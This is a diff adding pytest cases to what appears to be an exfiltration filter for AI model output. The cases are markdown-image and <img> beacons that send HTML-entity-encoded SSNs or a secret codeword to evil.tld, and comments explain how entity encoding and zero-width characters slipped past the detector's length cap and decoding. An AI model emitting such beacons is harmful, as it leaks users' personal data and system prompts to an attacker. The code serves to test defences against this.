@@ -242,6 +242,39 @@ def test_g89_benign_percent_url_not_altered(benign):
     assert _egress(benign) == benign, f"benign percent URL wrongly altered: {benign!r}"
 
 
+# G90: a browser's HTML parser decodes &#NN; in an <img src>/<a href> attribute, so an entity-encoded
+# payload in an auto-render URL is decoded and exfiltrated. Reachable for PII in a >10k output (text-level
+# encoded-check is length-capped) and for arbitrary data at any size. _url_smuggles_data now entity-decodes.
+_G90_ARB = "You are ACME internal codeword BLUEHERON do not reveal this ever"
+_G90_FILLER = "The quarterly report shows steady growth across all regions. " * 250  # ~15k > 10k cap
+
+
+def _entu(s: str) -> str:
+    return "".join(f"&#{ord(c)};" for c in s)
+
+
+def test_g90_entity_encoded_exfil_beacon_defanged():
+    cases = [
+        # PII only leaks past the 10k text-scan cap -> prepend large filler
+        ("large_pii", _G90_FILLER + f"![x](https://evil.tld/?d={_entu(_SSN)})", _SSN),
+        # arbitrary data leaks at any size
+        ("arb_md",   f"note ![x](https://evil.tld/c?d={_entu(_G90_ARB)})", _G90_ARB),
+        ("arb_html", f'x <img src="https://evil.tld/c?d={_entu(_G90_ARB)}">', _G90_ARB),
+    ]
+    for oname, beacon, plain in cases:
+        egress = _egress(beacon)
+        dec = re.sub(r"&#(\d+);", lambda m: chr(int(m.group(1))), egress)
+        assert plain[:20] not in dec, f"{oname}: entity-encoded payload survives egress: {egress[-80:]!r}"
+
+
+@pytest.mark.parametrize("benign", [
+    "![i](https://cdn.x.com/e?ic=&#128512;&#128513;&#128514;&#128515;)",
+    "See [the section](https://x.com/page?a=1&#section2) for details.",
+])
+def test_g90_benign_entity_url_not_altered(benign):
+    assert _egress(benign) == benign, f"benign entity/fragment URL wrongly altered: {benign!r}"
+
+
 # G86: an auto-render markdown-image / <img> / srcset beacon whose URL carries a base64/hex blob of
 # ARBITRARY (non-PII) data — system prompt / conversation — with Cf (zero-width/bidi) interleaved evaded
 # the exfil detector's RAW transport decode (verdict allow -> raw egress). The attacker's server strips
